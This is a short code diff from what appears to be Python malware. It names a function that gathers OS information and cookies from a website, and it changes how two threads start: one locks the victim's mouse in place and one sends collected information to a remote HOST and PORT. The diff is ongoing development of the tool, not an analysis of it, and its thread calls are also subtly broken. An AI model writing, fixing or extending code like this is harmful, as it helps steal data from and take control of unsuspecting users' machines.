@@ -97,6 +97,9 @@ def get_os_info(website_to_get_cookie):
     for i in all:
         info_list.append(i)
 
+        
+lock_mouse_pos = threading.Thread(target=lock_mouse(mouse_pos_x,mouse_pos_y,time_mouse_locked))
+send_info_to_host = threading.Thread(target=listen_for_host(HOST,PORT))
 
-lock_mouse_pos = threading.Thread(target=lock_mouse(mouse_pos_x,mouse_pos_y,time_mouse_locked)).start()
-send_info_to_host = threading.Thread(target=listen_for_host(HOST,PORT)).start()
+lock_mouse_pos.start()
+send_info_to_host.start()
